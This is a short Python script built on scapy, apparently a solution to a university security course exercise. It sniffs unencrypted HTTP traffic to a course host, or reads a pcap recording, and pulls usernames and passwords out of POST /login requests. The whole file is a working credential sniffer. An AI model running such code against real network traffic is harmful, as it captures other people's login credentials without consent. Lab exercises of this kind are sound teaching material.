import scapy.all as S


WEBSITE = 'infosec17.cs.tau.ac.il'


def packet_filter(packet):
    if not packet.haslayer(S.TCP):  # transport layer is tcp
        return False
    if not (packet[S.IP].dport == 80):  # http traffic
        return False
    if not (packet.haslayer(S.Raw) and ("Host: %s" % WEBSITE in packet.getlayer(S.Raw).load)):  # host is infosec
        return False
    return True


def parse_packet(packet):
    http_request = packet_filter(packet)  # check if http to infosec
    if not http_request:
        return None
    packet_payload = packet.getlayer(S.Raw).load
    login_request = "POST /login" in packet_payload  # check if login request
    if not login_request:
        return None
    # find properties in request
    password_index = packet_payload.find("password=")
    username_index = packet_payload.find("username=")
    username = packet_payload[username_index + len("password="): password_index - 1]
    password = packet_payload[password_index + len("username="):]
    return (username, password)


def main(args):
    # WARNING: DO NOT EDIT THIS FUNCTION!
    if '--help' in args:
        print 'Usage: %s [<path/to/recording.pcap>]' % args[0]

    elif len(args) < 2:
        # Sniff packets and apply our logic.
        S.sniff(lfilter=packet_filter, prn=parse_packet)

    else:
        # Else read the packets from a file and apply the same logic.
        for packet in S.rdpcap(args[1]):
            if packet_filter(packet):
                print parse_packet(packet)


if __name__ == '__main__':
    import sys
    main(sys.argv)
